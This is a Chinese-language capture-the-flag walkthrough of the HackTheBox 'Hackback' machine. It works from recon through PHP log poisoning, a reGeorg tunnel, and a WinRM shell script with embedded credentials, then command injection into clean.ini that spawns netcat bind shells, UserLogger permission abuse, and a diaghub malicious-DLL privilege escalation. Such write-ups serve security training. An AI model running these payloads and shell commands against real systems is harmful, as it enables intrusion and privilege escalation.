@@ -1,0 +1,817 @@
+Hackback是一个非常难的靶机，知识点涉及钓鱼网站、参数模糊测试、php日志中毒、HTTP代理、WinRm服务、UserLogger服务、NFTS数据流、恶意dll等知识。感兴趣的同学可以在HackTheBox中进行学习。  
+![](https://image.3001.net/images/20220224/1645668334_6216e7ee3e8e67de5dc3e.png!small)
+_通关思维导图_  
+![Hackback](https://image.3001.net/images/20220302/1646193659_621eebfb94d30cb62ff10.png!small)
+
+## 0x01 侦查
+
+ **端口探测**
+
+首先通过nmap对目标进行端口扫描
+
+    
+    
+    nmap -Pn -p- -sV -sC -A 10.10.10.128 -oA nmap_Hackback
+    
+
+![](https://image.3001.net/images/20220224/1645668336_6216e7f0f354780e06fe6.png!small)  
+![](https://image.3001.net/images/20220224/1645668341_6216e7f500eb12397e076.png!small)扫描结果显示目标开放了80、6666、64381端口
+
+####  **80端口**
+
+![](https://image.3001.net/images/20220224/1645668344_6216e7f8d92b092c6e1fa.png!small)  
+网站元素查看可以发现该站点采用 ASP.NET  
+![](https://image.3001.net/images/20220224/1645668349_6216e7fd1ef61e0f6c7de.png!small)
+
+####  **6666端口**
+
+    
+    
+    curl http://10.10.10.128:6666
+    
+
+![](https://image.3001.net/images/20220224/1645668350_6216e7fe852847453876e.png!small)  
+提示说缺少命令，尝试通过 wfuzz 来对正确的路径进行模糊测试
+
+    
+    
+    wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt --hc 404 http://10.10.10.128:6666/FUZZ
+    
+
+![](https://image.3001.net/images/20220224/1645668351_6216e7ffa740566bab119.png!small)  
+发现了一些路径，首先探测 help
+
+    
+    
+    curl http://10.10.10.128:6666/help
+    
+
+![](https://image.3001.net/images/20220224/1645668353_6216e801d153fe8a420bb.png!small)  
+在 help 中列出了全部参数，那么接下来测试这些路径
+
+    
+    
+    curl http://10.10.10.128:6666/hello
+    
+
+![](https://image.3001.net/images/20220224/1645668354_6216e802c0ee7adc364bf.png!small)
+
+    
+    
+    curl http://10.10.10.128:6666/proc | jq -c .[]
+    
+
+![](https://image.3001.net/images/20220224/1645668356_6216e8043d7da9737a43f.png!small)
+
+    
+    
+    curl http://10.10.10.128:6666/whoami
+    
+
+![](https://image.3001.net/images/20220224/1645668359_6216e8077086ab360bb32.png!small)
+
+    
+    
+    curl http://10.10.10.128:6666/list | jq -c .[]
+    
+
+![](https://image.3001.net/images/20220224/1645668361_6216e809e4e60437ac427.png!small)
+
+    
+    
+    curl http://10.10.10.128:6666/services | jq -c .[]
+    
+
+![](https://image.3001.net/images/20220224/1645668363_6216e80b955bc51985430.png!small)
+
+    
+    
+    curl -s http://10.10.10.128:6666/netstat | jq -r '.[] | select(.State=2) | "\(.LocalAddress):\(.LocalPort) [\(.OwningProcess)]"' | sed 's/::/0.0.0.0/g' | sort -n -t':' -k2
+    
+
+![](https://image.3001.net/images/20220224/1645668367_6216e80f4ecdc50b4fced.png!small)经过整理可以看到
+hello 返回一条打招呼信息；proc 返回进程列表；whoami 返回当前用户具体信息；list 返回网站目录当中的内容； services
+返回服务信息；netstat 返回端口连接情况，相比nmap探测的要多。
+
+####  **64831端口**
+
+是一个GoPhish登录界面  
+![](https://image.3001.net/images/20220224/1645668369_6216e811bd131176dea43.png!small)  
+通过默认账号密码 admin/gophish 进入  
+![](https://image.3001.net/images/20220224/1645668371_6216e8134a5cc2ff2a683.png!small)  
+在电子邮件模块下存在五个模块，分别是 Admin、Fackbook、HackTheBox、Paypal、Twitter  
+![](https://image.3001.net/images/20220224/1645668372_6216e8149582d9efd8505.png!small)  
+点击 Admin 模块，切换到 html 格式，可以发现存在一个域名  
+![](https://image.3001.net/images/20220224/1645668373_6216e815dafb1bfe3d43b.png!small)  
+点开其他的模块也可以发现不同的域名，经过整理后如下
+
+    
+    
+    admin.hackback.htb
+    www.facebook.htb
+    www.hackthebox.htb
+    www.paypal.htb
+    www.twitter.htb
+    
+
+将它们添加到hosts文件中配置DNS
+
+    
+    
+    vim /etc/hosts
+    ##配置
+    10.10.10.128 admin.hackback.htb www.hackthebox.htb www.twitter.htb www.paypal.htb www.facebook.htb
+    
+
+### 钓鱼网站
+
+设置完成后分别访问四个域  
+![](https://image.3001.net/images/20220224/1645668375_6216e817310cda9c95227.png!small)  
+![](https://image.3001.net/images/20220224/1645668376_6216e8186c9324e1a1d7c.png!small)  
+![](https://image.3001.net/images/20220224/1645668377_6216e819c90475ba988ba.png!small)  
+![](https://image.3001.net/images/20220224/1645668378_6216e81ae8322a6603526.png!small)  
+发现这些站点都是著名网站的登录界面，它们主要用于骗取受害人的登录信息，具体手法是通过发送包含钓鱼网站的电子邮件，受害者打开邮件访问这些站点输入账号密码后，就会被黑客获取到账号信息。查看数据包发现这些站点基于PHP和ASP.NET  
+![](https://image.3001.net/images/20220224/1645668380_6216e81c3b70b14bdeb42.png!small)
+
+### 管理员登录界面
+
+admin.hackback.htb 是一个不同于钓鱼网站的登录界面，查看页面源代码  
+![](https://image.3001.net/images/20220224/1645668381_6216e81d7b37bcff41cbe.png!small)  
+其中存在一个提示`<script src="js/.js"></script>`，但是访问 js 目录显示403，通过 gobuster 扫描 js 目录
+
+    
+    
+    gobuster dir -u http://admin.hackback.htb/js/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x js -t 50
+    
+
+![](https://image.3001.net/images/20220224/1645668382_6216e81eda1eda01d9d21.png!small)  
+查看`private.js`发现如下内容  
+![](https://image.3001.net/images/20220224/1645668384_6216e820924903ed9e230.png!small)  
+一般在js中使用 var 来定义字符串，而这个js择使用 ine 来定义字符串，猜测可能是经过rot13编码后的js代码
+
+    
+    
+    curl http://admin.hackback.htb/js/private.js | tr 'a-zA-Z' 'n-za-mN-ZA-M'
+    
+
+![](https://image.3001.net/images/20220224/1645668386_6216e822879bcc9baaf8d.png!small)
+
+放入`beautifier.io`中进行美化，获得如下 js 代码
+
+    
+    
+    var a = ['\x57\x78\x49\x6a\x77\x72\x37\x44\x75\x73\x4f\x38\x47\x73\x4b\x76\x52\x77\x42\x2b\x77\x71\x33\x44\x75\x4d\x4b\x72\x77\x72\x4c\x44\x67\x63\x4f\x69\x77\x72\x59\x31\x4b\x45\x45\x67\x47\x38\x4b\x43\x77\x71\x37\x44\x6c\x38\x4b\x33', '\x41\x63\x4f\x4d\x77\x71\x76\x44\x71\x51\x67\x43\x77\x34\x2f\x43\x74\x32\x6e\x44\x74\x4d\x4b\x68\x5a\x63\x4b\x44\x77\x71\x54\x43\x70\x54\x73\x79\x77\x37\x6e\x43\x68\x73\x4f\x51\x58\x4d\x4f\x35\x57\x38\x4b\x70\x44\x73\x4f\x74\x4e\x43\x44\x44\x76\x41\x6a\x43\x67\x79\x6b\x3d', '\x77\x35\x48\x44\x72\x38\x4f\x37\x64\x44\x52\x6d\x4d\x4d\x4b\x4a\x77\x34\x6a\x44\x6c\x56\x52\x6e\x77\x72\x74\x37\x77\x37\x73\x30\x77\x6f\x31\x61\x77\x37\x73\x41\x51\x73\x4b\x73\x66\x73\x4f\x45\x77\x34\x58\x44\x73\x52\x6a\x43\x6c\x4d\x4f\x77\x46\x7a\x72\x43\x6d\x7a\x70\x76\x43\x41\x6a\x43\x75\x42\x7a\x44\x73\x73\x4b\x39\x46\x38\x4f\x34\x77\x71\x5a\x6e\x57\x73\x4b\x68'];
+    (function(c, d) {
+        var e = function(f) {
+            while (--f) {
+                c['push'](c['shift']());
+            }
+        };
+        e(++d);
+    }(a, 0x66));
+    var b = function(c, d) {
+        c = c - 0x0;
+        var e = a[c];
+        if (b['MsULmv'] === undefined) {
+            (function() {
+                var f;
+                try {
+                    var g = Function('return\x20(function()\x20' + '{}.constructor(\x22return\x20this\x22)(\x20)' + ');');
+                    f = g();
+                } catch (h) {
+                    f = window;
+                }
+                var i = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+                f['atob'] || (f['atob'] = function(j) {
+                    var k = String(j)['replace'](/=+$/, '');
+                    for (var l = 0x0, m, n, o = 0x0, p = ''; n = k['charAt'](o++); ~n && (m = l % 0x4 ? m * 0x40 + n : n, l++ % 0x4) ? p += String['fromCharCode'](0xff & m >> (-0x2 * l & 0x6)) : 0x0) {
+                        n = i['indexOf'](n);
+                    }
+                    return p;
+                });
+            }());
+            var q = function(r, d) {
+                var t = [],
+                    u = 0x0,
+                    v, w = '',
+                    x = '';
+                r = atob(r);
+                for (var y = 0x0, z = r['length']; y < z; y++) {
+                    x += '%' + ('00' + r['charCodeAt'](y)['toString'](0x10))['slice'](-0x2);
+                }
+                r = decodeURIComponent(x);
+                for (var A = 0x0; A < 0x100; A++) {
+                    t[A] = A;
+                }
+                for (A = 0x0; A < 0x100; A++) {
+                    u = (u + t[A] + d['charCodeAt'](A % d['length'])) % 0x100;
+                    v = t[A];
+                    t[A] = t[u];
+                    t[u] = v;
+                }
+                A = 0x0;
+                u = 0x0;
+                for (var B = 0x0; B < r['length']; B++) {
+                    A = (A + 0x1) % 0x100;
+                    u = (u + t[A]) % 0x100;
+                    v = t[A];
+                    t[A] = t[u];
+                    t[u] = v;
+                    w += String['fromCharCode'](r['charCodeAt'](B) ^ t[(t[A] + t[u]) % 0x100]);
+                }
+                return w;
+            };
+            b['OoACcd'] = q;
+            b['qSLwGk'] = {};
+            b['MsULmv'] = !![];
+        }
+        var C = b['qSLwGk'][c];
+        if (C === undefined) {
+            if (b['pIjlQB'] === undefined) {
+                b['pIjlQB'] = !![];
+            }
+            e = b['OoACcd'](e, d);
+            b['qSLwGk'][c] = e;
+        } else {
+            e = C;
+        }
+        return e;
+    };
+    var x = '\x53\x65\x63\x75\x72\x65\x20\x4c\x6f\x67\x69\x6e\x20\x42\x79\x70\x61\x73\x73';
+    var z = b('0x0', '\x50\x5d\x53\x36');
+    var h = b('0x1', '\x72\x37\x54\x59');
+    var y = b('0x2', '\x44\x41\x71\x67');
+    var t = '\x3f\x61\x63\x74\x69\x6f\x6e\x3d\x28\x73\x68\x6f\x77\x2c\x6c\x69\x73\x74\x2c\x65\x78\x65\x63\x2c\x69\x6e\x69\x74\x29';
+    var s = '\x26\x73\x69\x74\x65\x3d\x28\x74\x77\x69\x74\x74\x65\x72\x2c\x70\x61\x79\x70\x61\x6c\x2c\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2c\x68\x61\x63\x6b\x74\x68\x65\x62\x6f\x78\x29';
+    var i = '\x26\x70\x61\x73\x73\x77\x6f\x72\x64\x3d\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a';
+    var k = '\x26\x73\x65\x73\x73\x69\x6f\x6e\x3d';
+    var w = '\x4e\x6f\x74\x68\x69\x6e\x67\x20\x6d\x6f\x72\x65\x20\x74\x6f\x20\x73\x61\x79';
+    
+
+这段代码将a设置为三个二进制 blob 的数组，使用 0x66 运行一个函数，定义函数 b 用于解码。将其放入本地 js
+运行，也可在`tio.run`站点运行
+
+    
+    
+    js 
+    > var ...
+    
+
+![](https://image.3001.net/images/20220224/1645668389_6216e825c690baf476d6f.png!small)  
+根据提示访问`2bb6916122f1da34dcd916421e531578`目录，直接访问会重定向回主目录。在该目录下访问其他路径会提示404，说明可能存在其他文件，在其中进行目录扫描
+
+    
+    
+    gobuster dir -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/ -w /usr/share/wordlists/dirb/big.txt -xphp -t 50
+    
+
+![](https://image.3001.net/images/20220224/1645668393_6216e82904f1efac7ab89.png!small)  
+发现webadmin.php，之后开始对参数进行构造，发现 acton=list 下会有回显密码错误
+
+    
+    
+    curl 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=hackthebox&password=test&session='
+    
+
+![](https://image.3001.net/images/20220224/1645668394_6216e82acb8590bee15d3.png!small)使用
+wfuzz 对密码进行模糊测试
+
+    
+    
+    wfuzz -c -w /usr/share/wordlists/SecLists/Passwords/darkweb2017-top1000.txt --hw 0 --hh 17 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=hackthebox&password=FUZZ&session='
+    
+
+![](https://image.3001.net/images/20220224/1645668396_6216e82c3009d473ca26a.png!small)发现密码为12345678，使用该密码查看返回信息
+
+    
+    
+    curl 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=hackthebox&password=12345678&session='
+    
+
+![](https://image.3001.net/images/20220224/1645668398_6216e82e5fa10e4e098a1.png!small)  
+成功返回日志，但是这是哪个站点的日志呢？经过测试后发现登录 hackthebox后会出现一个新的日志，其中sessionid就是我的内网地址  
+![](https://image.3001.net/images/20220224/1645668399_6216e82fd3f9688b0ff76.png!small)将日志名设置为该seesionid同时修改action为show后可以获取日志内容
+
+    
+    
+    curl -b "PHPSESSIONID=3c4b5b07fe829951a788d023036262fb6f49340d22959897bd937d096bc8183d" 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&site=hackthebox&password=12345678&session=3c4b5b07fe829951a788d023036262fb6f49340d22959897bd937d096bc8183d'
+    
+
+![](https://image.3001.net/images/20220224/1645668400_6216e830cb032c118a1e1.png!small)
+
+## 0x02 上线[simple]
+
+### php日志中毒
+
+虽然无法知道知道它的真实路径，但是可以将php代码写入日志文件后查看。使用 BurpSuite 抓取 admin.hackthebox.htb
+的登录数据包并修改用户名为php代码，将其作为代码执行点  
+![](https://image.3001.net/images/20220224/1645668402_6216e83232cc0154291c7.png!small)
+**查询日志记录**
+
+    
+    
+    curl -b "PHPSESSIONID=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7" 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&site=hackthebox&password=12345678&session=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7'
+    
+
+![](https://image.3001.net/images/20220224/1645668403_6216e83345c14ac3cfc64.png!small)发现php代码成功执行，那么我们开始执行
+whoami  
+![](https://image.3001.net/images/20220224/1645668404_6216e834663afcdaedbbe.png!small)返回一个逗号说明
+whoami 命令没起作用  
+![](https://image.3001.net/images/20220224/1645668405_6216e8358d9e596c6e203.png!small)  
+php可以列出和读取文件都是在 list 和 show 操作中完成的，在创建这些日志文件时也在写入文件。那么可以在执行点中通过函数 scandir 和
+print_r 列出目录并打印结果
+
+    
+    
+    <?php echo print_r(scandir($_GET['dir']));?>
+    
+
+![](https://image.3001.net/images/20220224/1645668406_6216e836cc1da36af6468.png!small)在执行点中通过参数
+show 传递 dir 命令
+
+    
+    
+    curl -b "PHPSESSIONID=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7" 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&site=hackthebox&password=12345678&session=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7&dir=.'
+    
+
+![](https://image.3001.net/images/20220224/1645668408_6216e8381e044a558d543.png!small)成功返回当前目录文件名，在执行点中写入`<?php
+include($_GET['file']);?>`尝试进行文件读取  
+![](https://image.3001.net/images/20220224/1645668409_6216e839bf27c35997860.png!small)
+
+    
+    
+    curl -b "PHPSESSIONID=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7" 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&site=hackthebox&password=12345678&session=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7&dir=.&file=index.html'
+    
+
+![](https://image.3001.net/images/20220224/1645668410_6216e83aea547286aac79.png!small)成功返回index.html内容。为了防止乱码，在执行点中尝试通过php过滤器经过
+base64 编码来读取php文件
+
+    
+    
+    curl -b "PHPSESSIONID=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7" 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&site=hackthebox&password=12345678&session=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7&dir=.&file=php://filter/convert.base64-encode/resource=webadmin.php'
+    
+
+![](https://image.3001.net/images/20220224/1645668412_6216e83c5c2058badf89a.png!small)成功返回，将内容进行
+base64 解码即可
+
+    
+    
+    cat webadmin.php.bs64 | base64 -d
+    
+
+![](https://image.3001.net/images/20220224/1645668416_6216e8404202a184fd924.png!small)既然可以读取文件，那么可以尝试写入文件，通过
+file_out_contents 在目标上写入文件，先尝试获取一个base64编码
+
+    
+    
+    echo "mac is good" | base64 -w0
+    
+
+在执行点中将内容写入日志中完成命令执行
+
+    
+    
+    <?php $f="bWFjIGlzIGdvb2QK";file_put_contents("mac.txt",base64_decode($f));?>
+    
+
+![](https://image.3001.net/images/20220224/1645668418_6216e8423198ee573fa4e.png!small)查看当前目录，发现
+mac.txt 已经写入，需要注意的是以下命令得执行两次才能看到写入的文件
+
+    
+    
+    curl -b "PHPSESSIONID=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7" 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&site=hackthebox&password=12345678&session=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7&dir=.'
+    
+
+![](https://image.3001.net/images/20220224/1645668419_6216e84362e3a423371bd.png!small)访问文件地址查看
+mac.txt 文件内容
+
+    
+    
+    curl http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/mac.txt
+    
+
+![](https://image.3001.net/images/20220224/1645668420_6216e844d062421e712be.png!small)  
+到目前为止，我们知道该执行点可以列出文件、查看文件以及写入文件。接下来在执行点中写入代码查看上层目录
+
+    
+    
+    <?php print_r(scandir('..'));?>
+    
+
+![](https://image.3001.net/images/20220224/1645668421_6216e845bcd2a28cea846.png!small)**查看上层文件路径**
+
+    
+    
+    curl -b "PHPSESSIONID=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7" 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&site=hackthebox&password=12345678&session=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7&dir=..'
+    
+
+![](https://image.3001.net/images/20220224/1645668423_6216e84719546b56eaaa4.png!small)  
+发现 web.config 以及 web.config.old，那么继续在执行点中写入PHP代码查看它们的内容
+
+    
+    
+    <?php echo file_get_contents('../web.config');?>
+    <?php echo file_get_contents('../web.config.old');?>
+    
+
+![](https://image.3001.net/images/20220224/1645668424_6216e848aa5ec2e418cd3.png!small)  
+在 web.config.old 中发现存在 Windows 用户账号密码  
+![](https://image.3001.net/images/20220224/1645668425_6216e849df2da4365d8ef.png!small)
+
+### 借助代理完成WinRM上线
+
+在之前的信息收集我们知道6666端口监听的是 winRM 服务，该站点上可以运行 ASP.NET 以及 php，但是在 php
+中存在被阻止函数，所以我们尝试使用 ASP.NET 类型的代理，那么开始上传 regeorg 代理
+
+ **工具地址：https://github.com/sensepost/reGeorg**
+
+首先将tunnel.aspx转换为base64编码
+
+    
+    
+    cat tunnel.aspx | base64 -w0
+    
+
+![](https://image.3001.net/images/20220224/1645668427_6216e84b6493acf5857bd.png!small)  
+上传该base64编码并通过base64_decode()解码  
+![](https://image.3001.net/images/20220224/1645668429_6216e84dba17415ba6d8a.png!small)执行后访问日志，再查看文件可以发现隧道已经建立，说明成功上传代理脚本
+
+    
+    
+    curl 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=hackthebox&password=12345678&session='
+    curl http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tunnel.aspx
+    
+
+![](https://image.3001.net/images/20220224/1645668430_6216e84ed78ffff16e249.png!small)接下来设置
+proxychains 本地代理
+
+    
+    
+    vim /etc/proxychains4.conf
+    ## 配置
+    127.0.0.1 8888
+    
+
+使用 reGeorgSocksProxy 开启代理，建立 http 隧道
+
+    
+    
+    python reGeorgSocksProxy.py -p 8888 -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tunnel.aspx
+    
+
+![](https://image.3001.net/images/20220224/1645668431_6216e84fbcd22fe0ec57a.png!small)  
+通过 WinRm 脚本连接，对 Alamot 的Ruby脚本增添上传功能。代码如下
+
+ **原脚本地址：https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb**
+
+    
+    
+    require 'winrm-fs'
+    
+    # Author: Alamot
+    # To upload a file type: UPLOAD local_path remote_path
+    # e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
+    
+    conn = WinRM::Connection.new(
+      endpoint: 'http://127.0.0.1:5985/wsman',
+      user: 'simple',
+      password: 'ZonoProprioZomaro:-(',
+      :no_ssl_peer_verification => true
+    )
+    
+    file_manager = WinRM::FS::FileManager.new(conn)
+    
+    
+    class String
+      def tokenize
+        self.
+          split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
+          select {|s| not s.empty? }.
+          map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
+      end
+    end
+    
+    
+    command=""
+    
+    conn.shell(:powershell) do |shell|
+        until command == "exit\n" do
+            output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi -force $pwd).Name),'> ')")
+            print(output.output.chomp)
+            command = gets
+            if command.start_with?('UPLOAD') then
+                upload_command = command.tokenize
+                print("Uploading " + upload_command[1] + " to " + upload_command[2])
+                file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
+                    puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
+                end
+                command = "echo `nOK`n"
+            end
+    
+            output = shell.run(command) do |stdout, stderr|
+                STDOUT.print(stdout)
+                STDERR.print(stderr)
+            end
+        end
+        puts("Exiting with code #{output.exitcode}")
+    end
+    
+
+通过代理执行winrm_shell.rb
+
+    
+    
+    proxychains ruby winrm_shell.rb
+    
+
+![](https://image.3001.net/images/20220224/1645668432_6216e850e55e23331c7fe.png!small)  
+成功上线 simple 用户
+
+## 0x03 权限提升[hacker]
+
+### 查看本地环境
+
+ **powershell环境**  
+查看当前语言环境为完整的语言模式
+
+    
+    
+    $executioncontext.sessionstate.languagemode
+    
+
+![](https://image.3001.net/images/20220224/1645668434_6216e8525f11efa3ec5c1.png!small)**AppLocker绕过**  
+上传 nc.exe 到`\windows\system32\spool\drivers\color`目录下，用于绕过 AppLocker
+
+    
+    
+    UPLOAD /root/hackthebox/Machines/Hackback/nc.exe C:\Windows\system32\spool\drivers\color\nc.exe
+    
+
+![](https://image.3001.net/images/20220224/1645668435_6216e853da1772586f020.png!small)  
+在本地开启nc监听443端口，但是无法回连
+
+    
+    
+    \Windows\system32\spool\drivers\color\nc.exe 10.10.14.14 443
+    
+
+**防火墙限制**  
+查看防火墙是否对出口流量作出了限制
+
+    
+    
+    cmd /c "netsh advfirewall show currentprofile"
+    
+
+![](https://image.3001.net/images/20220224/1645668437_6216e855420cb0b84e640.png!small)
+
+防火墙默认设置是阻止进出，查看对应的规则
+
+    
+    
+    cmd /c "netsh advfirewall firewall show rule name=all"
+    
+
+![](https://image.3001.net/images/20220224/1645668439_6216e85708e7e8747894d.png!small)显示存在两个规则：ping、web，其中
+web 端口包括80、6666和64831，因此我们只能通过这几个端口出口流量
+
+### 查看目录文件
+
+查看根目录，重点关注`util`目录
+
+    
+    
+    dir c:\
+    
+
+![](https://image.3001.net/images/20220224/1645668441_6216e8598cb77d7f03385.png!small)查看该目录下的所有文件
+
+    
+    
+    dir c:\util -force
+    
+
+![](https://image.3001.net/images/20220224/1645668443_6216e85b78ffb1f7d5809.png!small)重点关注隐藏文件夹`scripts`
+
+    
+    
+    dir c:\util\scripts
+    
+
+![](https://image.3001.net/images/20220224/1645668445_6216e85d125c801452c48.png!small)  
+发现 log.txt 和 batch.log 今天还在更新，而 dellog.ps1 是一个脚本。我们只能查看log.txt，而 batch.log 和
+dellog.ps1 没有权限查看  
+![](https://image.3001.net/images/20220224/1645668447_6216e85f28ef2db46b387.png!small)  
+![](https://image.3001.net/images/20220224/1645668448_6216e860647cf896f216e.png!small)
+
+### 命令注入完成nc上线
+
+检查文件 clean.ini，猜测是 dellog.ps1 的参数文件  
+![](https://image.3001.net/images/20220224/1645668449_6216e8618b3bd085a6f6c.png!small)dellog.ps1
+执行时会把 clean.ini 中的内容作为参数执行，因此这里存在命令注入漏洞。我们可以编辑 clean.ini，向其中写入命令
+
+    
+    
+    echo [Main] > C:\util\scripts\clean.ini
+    echo Lifetime=100 >> C:\util\scripts\clean.ini
+    echo "LogFile=c:\util\scripts\log.txt & cmd.exe /c c:\\Windows\system32\spool\drivers\color\nc.exe -lvp 2222 -e cmd.exe" >> C:\util\scripts\clean.ini
+    echo "Directory=c:\inetpub\logs\logfiles" >> C:\util\scripts\clean.ini
+    
+
+![](https://image.3001.net/images/20220224/1645668450_6216e862cdd6958101ba8.png!small)成功写入命令，过五分钟左右监听器会启动，通过代理
+nc 可连接目标
+
+    
+    
+    proxychains nc 10.10.10.128 2222
+    
+
+![](https://image.3001.net/images/20220224/1645668452_6216e8640fa615fd9afce.png!small)成功获取shell，在当前用户桌面上找到第一个flag
+
+    
+    
+    dir c:\Users\hacker\Desktop
+    type c:\Users\hacker\Desktop\user.txt
+    
+
+![](https://image.3001.net/images/20220224/1645668453_6216e8657cf181157850f.png!small)成功拿到第一个flag
+
+## 0x04 权限提升[system]
+
+### 分析UserLogger服务
+
+通过枚举可以发现存在一个不认识的服务`UserLogger`，在注册表查看该服务
+
+    
+    
+    reg query HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\userlogger
+    
+
+![](https://image.3001.net/images/20220224/1645668454_6216e866dfd47c62065fc.png!small)  
+启动服务`UserLogger`，指定目录为`c:\mac`
+
+    
+    
+    sc start userlogger c:\mac
+    
+
+![](https://image.3001.net/images/20220224/1645668456_6216e868a15d0d35f23bc.png!small)查看根目录发现
+mac.log 已经生成，查看该日志文件  
+![](https://image.3001.net/images/20220224/1645668458_6216e86a3e837ae07d565.png!small)查看文件权限，为
+everyone
+
+    
+    
+    cacls C:\mac.log
+    
+
+![](https://image.3001.net/images/20220224/1645668460_6216e86c427195857adb6.png!small)  
+经过分析这个服务可以将输入路径的最后一个文件名拼接上.log，同时修改文件的权限。由于windows的文件名不接受:，可以在文件名最后加上:进行截断，也就是当它读取.log的所有内容时，:将被删除，新权限将被应用到文件名上。
+
+### NTFS数据流读取root.txt
+
+那么可以尝试读取root.txt。首先进入administrator目录
+
+    
+    
+    sc start userlogger "c:\users\administrator:"
+    icacls c:\users\administrator
+    cd c:\users\administrator
+    
+
+![](https://image.3001.net/images/20220224/1645668461_6216e86d4bba8cd21c6b5.png!small)成功进入，接下来读取root.txt
+
+    
+    
+    sc stop userlogger
+    sc start userlogger "c:\users\administrator\desktop\root.txt:"
+    
+
+如果在 cmd 下直接读取是读取不到的，需要转换到 powershell 命令窗口才可以看到
+
+    
+    
+    poweshell
+    copy c:\users\administrator\desktop\root.txt .
+    cat root.txt
+    
+
+![](https://image.3001.net/images/20220224/1645668463_6216e86f4a4d40d3a2406.png!small)  
+该文件不是我们想要的，应该需要使用ntfs数据流来进行读取
+
+    
+    
+    Get-Item c:\users\administrator\root.txt -force -stream *
+    
+
+![](https://image.3001.net/images/20220224/1645668466_6216e872078b88a845897.png!small)
+
+    
+    
+    cat c:\users\administrator\root.txt:flag.txt
+    
+
+![](https://image.3001.net/images/20220224/1645668468_6216e8745291817434442.png!small)成功获取第二个flag
+
+### 恶意dll上线system
+
+在2018年4月，Google的`Project Zero`发表文章，谈论 diaghub 服务可以指示 system32
+以system身份从内部加载dll，那么当它加载时，不会检查文件的扩展名，所以只要写入一个 dll 到 system32 中，就可以要求 diaghub
+加载它。鉴于此，我可以使用与 system 相同的路径，通过 userlogger 写入 system32，将恶意dll放入log文件中，然后调用
+diaghub 来加载它。
+
+ **exp源地址：https://github.com/decoder-it/diaghub_exploit**
+
+开始制作恶意 dll 文件，在此需要使用到 Visual Stdio，将上述文件夹打开并生成，选择SDK为10.0.17736.0  
+![](https://image.3001.net/images/20220224/1645668469_6216e875542f2e1e37c1a.png!small)成功生成项目  
+![](https://image.3001.net/images/20220224/1645668470_6216e876d111a85a4ff47.png!small)在shell中将以下代码写入
+mac.bat 中
+
+    
+    
+    C:\Windows\system32\spool\drivers\color\nc.exe -l -p 5555 -e cmd.exe
+    
+
+![](https://image.3001.net/images/20220224/1645668472_6216e878175c3cf129dc4.png!small)在
+FakeDLL.cpp 中修改命令代码为本地执行bat脚本路径  
+![](https://image.3001.net/images/20220224/1645668473_6216e87938f2fffa66c3a.png!small)点击重新生成即可  
+![](https://image.3001.net/images/20220224/1645668474_6216e87a4566cd8fa25eb.png!small)同理在
+diaghub_exploit.cpp 中修改执行的目录环境，用于绕过 AppLocker 应用策略  
+![](https://image.3001.net/images/20220224/1645668475_6216e87bde9b72b035cc7.png!small)点击重新生成，然后在目录中找到
+diaghub_exploit.exe 和 FakeDll.dll  
+![](https://image.3001.net/images/20220224/1645668476_6216e87cbea34760884bf.png!small)  
+把它们上传到`C:\Windows\system32\spool\drivers\color\`目录下
+
+    
+    
+    UPLOAD diaghub_exploit.exe C:\Windows\system32\spool\drivers\color\mac.exe
+    UPLOAD FakeDll.dll C:\Windows\system32\spool\drivers\color\FakeDll.dll
+    
+
+![](https://image.3001.net/images/20220224/1645668477_6216e87dde80dfcef4a98.png!small)进入
+powershell 命令行开启 UserLogger，并将 FakeDll.dll 拷贝到`C:\windows\system32\`目录下
+
+    
+    
+    cmd /c  "sc.exe start userlogger C:\windows\system32\mac"
+    copy C:\Windows\system32\spool\drivers\color\FakeDll.dll C:\windows\system32\mac.log
+    
+
